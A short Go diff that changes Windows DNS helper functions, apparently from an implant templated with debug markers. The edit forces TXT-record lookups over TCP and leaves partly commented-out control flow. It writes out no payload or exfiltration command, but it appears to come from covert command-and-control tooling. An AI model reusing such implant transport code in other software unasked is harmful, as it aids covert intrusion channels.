@@ -41,7 +41,6 @@ func toUint32Ptr(x uint32) *uint32 {
 }
 
 func getDNSResolver() (string, error) {
-
 	size := toUint32Ptr(uint32(5000))
 	addr, _ := sysAlloc(5000)
 	info := (win.PFIXED_INFO)(unsafe.Pointer(addr))
@@ -55,7 +54,7 @@ func getDNSResolver() (string, error) {
 	}
 	ip := fmt.Sprintf("%s", info.DnsServerList.IpAddress)
 	ip = ip[1:strings.Index(ip, "\x00")]
-	return ip
+	return ip, nil
 }
 
 func dnsLookup(domain string) (string, error) {
@@ -63,14 +62,14 @@ func dnsLookup(domain string) (string, error) {
 	// {{if .Debug}}
 	log.Printf("[dns] resolver ip: %#v", resolverIP)
 	// {{end}}
-	result, err := dnsUDPLookup(resolverIP, domain)
-	if err != nil {
-		// {{if .Debug}}
-		log.Printf("[dns] udp resolver failed with %s", err)
-		log.Printf("[dns] attempting dns over tcp ...")
-		// {{end}}
-		result, err = dnsTCPLookup(resolverIP, domain)
-	}
+	//result, err := dnsUDPLookup(resolverIP, domain)
+	//if err != nil {
+	// {{if .Debug}}
+	//log.Printf("[dns] udp resolver failed with %s", err)
+	log.Printf("[dns] attempting dns over tcp ...")
+	// {{end}}
+	result, err := dnsTCPLookup(resolverIP, domain)
+	//}
 	return result, err
 }
 
@@ -95,6 +94,7 @@ func dnsUDPLookup(resolverIP string, domain string) (string, error) {
 		// {{end}}
 		return "", err
 	}
+
 	return strings.Join(txts, ""), nil
 }
 
